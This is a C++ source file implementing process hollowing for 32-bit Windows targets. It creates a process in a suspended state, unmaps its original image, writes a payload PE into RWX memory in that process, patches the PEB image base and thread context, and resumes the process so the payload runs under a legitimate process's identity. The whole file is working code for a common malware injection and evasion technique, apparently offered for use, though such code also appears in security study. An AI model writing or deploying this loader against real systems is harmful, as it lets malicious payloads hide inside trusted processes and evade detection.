#pragma once
#include "windows.h"
#include "process_hollowing.h"
#include "PE.h"
NTSTATUS(NTAPI* _NtUnmapViewOfSection) (IN HANDLE ProcessHandle, IN PVOID BaseAddress);
BOOL loadNtUnmapViewOfSection() {
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll) {
		return FALSE;
	}
	FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNtdll, "NtUnmapViewOfSection");
	if (!fpNtUnmapViewOfSection) {
		return FALSE;
	}
	_NtUnmapViewOfSection = (NTSTATUS(NTAPI*) (HANDLE, PVOID))fpNtUnmapViewOfSection;
	return TRUE;
}

BOOL processHollowing(LPWSTR targetPath, PVOID pBuffer, DWORD dwBufferSize) {
	DWORDLONG dwlDesiredBase = NULL;
	BOOL unmapTarget = FALSE;
	if (!loadNtUnmapViewOfSection()) {
		printf("Can't load NtUnmapViewOfSection\n");
		return FALSE;
	}

	PIMAGE_NT_HEADERS32 pNtHeaders = getNTHeaders32(pBuffer);
	if (!pNtHeaders) {
		printf("Invalid PE file...\n");
		return FALSE;
	}

	DWORDLONG dwlOldImageBase = pNtHeaders->OptionalHeader.ImageBase;
	SIZE_T	imageSize = pNtHeaders->OptionalHeader.SizeOfImage;

	//set subsystem always to GUI to avoid crashes
	pNtHeaders->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;

	// Create target process
	PROCESS_INFORMATION processInfo = PROCESS_INFORMATION();
	STARTUPINFO startupInfo = STARTUPINFO();

	startupInfo.cb = sizeof(STARTUPINFO);
	if (!CreateProcess(
		NULL,
		targetPath,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED,
		NULL,
		NULL,
		&startupInfo,
		&processInfo
	)) {
		printf("[*] Creating process fails...\n");
		return FALSE;
	}

	printf("Created process PID %d\n", processInfo.dwProcessId);
	DWORD dwResult;
#if defined(_WIN64)
	WOW64_CONTEXT context = WOW64_CONTEXT();
	context.ContextFlags = CONTEXT_INTEGER;
	dwResult = Wow64GetThreadContext(processInfo.hThread, &context);
#else
	CONTEXT context = CONTEXT();
	context.ContextFlags = CONTEXT_INTEGER;
	dwResult = GetThreadContext(processInfo.hThread, &context);
#endif

	if (!dwResult) {
		printf("Get thread context fails...\n");
		return FALSE;
	}

	// Get image base of target
	DWORD dwPEBAddr = context.Ebx;
	printf("PEB is at 0x%x\n", dwPEBAddr);


	DWORD dwTargetImageBase = 0;
	// read in target image base
	if (!ReadProcessMemory(
		processInfo.hProcess,
		LPVOID(dwPEBAddr + 8),
		&dwTargetImageBase,
		sizeof(DWORD),
		NULL
	)) {
		printf("Can't read from PEB...\n");
		TerminateProcess(processInfo.hProcess, 1);
		return FALSE;
	}
	if (!dwTargetImageBase) {
		printf("Can't read from PEB...\n");
		TerminateProcess(processInfo.hProcess, 1);
		return FALSE;
	}

	if (hasRelocDirectory(pBuffer) == FALSE) {
		// if file has no relocations, have to use original image base
		dwlDesiredBase = pNtHeaders->OptionalHeader.ImageBase;
	}

	if (unmapTarget || (DWORDLONG)dwTargetImageBase == dwlDesiredBase) {
		// Unmap if specify unmapTarget or desiredBase is the same as targetimagebase
		if (_NtUnmapViewOfSection(processInfo.hProcess, (PVOID)dwTargetImageBase) != ERROR_SUCCESS) {
			printf("Unmapping target fail\n");
			TerminateProcess(processInfo.hProcess, 1);
			return FALSE;
		}
	}

	// allocate virtual space most suitable for payload
	LPVOID lpRemoteAddress = VirtualAllocEx(
		processInfo.hProcess,
		(LPVOID)dwlDesiredBase,
		imageSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	if (!lpRemoteAddress) {
		printf("Can't allocate memory in remote process\n");
		TerminateProcess(processInfo.hProcess, 1);
		return FALSE;
	}
	printf("Allocated remote ImageBase: %p size: 0x%lx\n", lpRemoteAddress, static_cast<ULONG>(imageSize));

	// change image base in file headers to the newly allocated region
	pNtHeaders->OptionalHeader.ImageBase = static_cast<DWORD>((ULONGLONG)lpRemoteAddress);


	//first we will prepare the payload image in the local memory, 
	//so that it will be easier to edit it, apply relocations etc.
	//when it will be ready, we will copy it into the space reserved in the target process

	LPVOID lpLocalAddress = VirtualAlloc(
		NULL,
		imageSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	if (!lpLocalAddress) {
		printf("Can't allocate memory in local process\n");
		TerminateProcess(processInfo.hProcess, 1);
		return FALSE;
	}

	printf("Allocated local memory: %p size: 0x%lx\n", lpLocalAddress, static_cast<ULONG>(imageSize));

	if (!mapPEVirtualLocal(pBuffer, imageSize, lpLocalAddress)) {
		printf("Can't map PE into local memory\n");
		TerminateProcess(processInfo.hProcess, 1);
		return FALSE;
	}

	//if the base address of the payload changed, we need to apply relocations:
	if ((DWORDLONG)lpRemoteAddress != dwlOldImageBase) {
		if (!applyRelocation(
			dwlOldImageBase,
			(DWORDLONG)lpRemoteAddress,
			lpLocalAddress
		)) {
			printf("Can't relocate image\n");
			TerminateProcess(processInfo.hProcess, 1);
			return FALSE;
		}
	}
	SIZE_T writtenBytes = 0;

	if (!WriteProcessMemory(processInfo.hProcess, lpRemoteAddress, lpLocalAddress, imageSize, &writtenBytes)) {
		printf("Can't write local image to remote process image\n");
		TerminateProcess(processInfo.hProcess, 1);
		return FALSE;
	}
	if (writtenBytes != imageSize) {
		printf("Can't write local image to remote process image\n");
		TerminateProcess(processInfo.hProcess, 1);
		return FALSE;
	}

	//free the locally allocated copy
	VirtualFree(lpLocalAddress, imageSize, MEM_FREE);

	// Overwrite imagebase stored in PEB
	DWORD dwRemoteAddr32b = static_cast<DWORD>((ULONGLONG)lpRemoteAddress);
	if (!WriteProcessMemory(
		processInfo.hProcess,
		LPVOID(dwPEBAddr + 8),
		&dwRemoteAddr32b,
		sizeof(DWORD),
		&writtenBytes
	)) {
		printf("Failed overwriting PEB\n");
		TerminateProcess(processInfo.hProcess, 1);
		return FALSE;
	}

	// Overwriting context: set new entrypoint
	context.Eax = static_cast<DWORD>((DWORDLONG)lpRemoteAddress + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
	printf("New entry point 0x%x\n", context.Eax);

#if defined(_WIN64)
	Wow64SetThreadContext(processInfo.hThread, &context);
#else
	SetThreadContext(processInfo.hThread, &context);
#endif

	ResumeThread(processInfo.hThread);

	CloseHandle(processInfo.hProcess);
	CloseHandle(processInfo.hThread);
	return TRUE;
}